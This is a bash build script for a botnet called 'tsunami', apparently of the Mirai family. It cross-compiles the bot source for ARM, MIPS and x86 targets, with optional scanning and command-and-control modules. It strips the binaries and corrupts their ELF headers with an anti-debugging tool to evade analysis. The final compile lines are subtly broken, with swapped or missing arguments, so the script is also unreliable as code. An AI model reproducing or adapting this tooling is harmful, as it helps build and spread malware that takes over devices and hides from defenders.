#!/bin/bash

output_dir="output"
debug=""
command="-D TSUNAMI_COMMAND"
eh_frame_ptr="--remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr"
scan="-D TSUNAMI_SCAN"

compile()
{
    echo "[build] Building $1..."
    # Dont strip the frame pointer it causes issues when building arm7
    if [ $1 == "armv7l" ]; then eh_frame_ptr=""; fi
    "$1-gcc" -static $6 bot/*.c $scan $command -Os $debug -fomit-frame-pointer -fdata-sections -D BOT_ARCH=\"$4\" -D ARCH_LEN=$5 -ffunction-sections -Wl,--gc-sections -o $output_dir/$2
    "$1-strip" -S --strip-unneeded --remove-section=.ARM.attributes --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt $eh_frame_ptr $output_dir/$2
    if [ -f $output_dir/$2 ]; then tools/anti_debug$3 $output_dir/$2; echo "[build] Built $1 wrote to $output_dir/$2, corrupted ELF $3 bit section header, we can now be used."; return; fi
    echo "[build] Failed to build $1."
    return
}

if [ $# != 3 ]
then
    echo "$0 [debug/nodebug] [command/nocommand] [scan/noscan]"
    exit 1
fi

if [ $1 == "debug" ]
then
    echo "[build] Compiling the bot in DEBUG mode"
    debug="-D DEBUG"
fi

if [ $2 == "nocommand" ]
then
    echo "[build] Compiling the bot without command functions"
    command=""
fi

if [ $3 == "noscan" ]
then
    echo "[build] Compiling the bot without scanning modules"
    scan=""
fi

# Compile the anti-debugging tool for 32/64 bit
gcc tools/anti_debug.c -o tools/anti_debug64 -s -Os -D ELF_64
gcc tools/anti_debug.c -o tools/anti_debug32 -s -Os -D ELF_32

# Compile the bot
compile armv5l tsunami.arm 32 arm 3
compile armv7l tsunami.arm7 32 arm7 4
compile i586 i586 32 tsunami.i586 4
compile mips tsunami.mips 32 tsunami.mips 4
compile mipsel tsunami.mpsl 32 mipsel 4
compile tsunami.x86_64 64 6
